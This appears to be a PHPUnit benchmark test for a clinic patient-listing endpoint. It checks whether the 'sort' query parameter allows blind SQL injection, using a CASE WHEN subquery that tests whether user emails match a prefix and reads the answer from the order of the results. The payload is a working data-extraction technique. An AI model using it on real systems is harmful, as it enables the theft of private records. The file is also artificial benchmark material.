<?php

namespace Tests\Feature\Benchmark;

use PHPUnit\Framework\Attributes\Group;

#[Group('benchmark')]
class S03Test extends BenchmarkTestCase
{
    public function test_sort_parameter_leaks_data_through_result_order(): void
    {
        $alice = $this->makeUser('alice@clinic.test');
        $this->makePatient($alice, 'Adams', '999');
        $this->makePatient($alice, 'Zane', '111');

        $oracle = fn (string $prefix) => "CASE WHEN (SELECT COUNT(*) FROM users WHERE email LIKE '{$prefix}%') > 0 THEN name ELSE phone END";

        $true = $this->actingAs($alice)->getJson('/clinic/patients?sort=' . urlencode($oracle('alice')));
        $false = $this->actingAs($alice)->getJson('/clinic/patients?sort=' . urlencode($oracle('nobody')));

        $true->assertOk();
        $false->assertOk();
        $this->assertNotSame(
            array_column($true->json(), 'name'),
            array_column($false->json(), 'name'),
            'Result order should reveal whether the injected condition is true.'
        );
    }
}
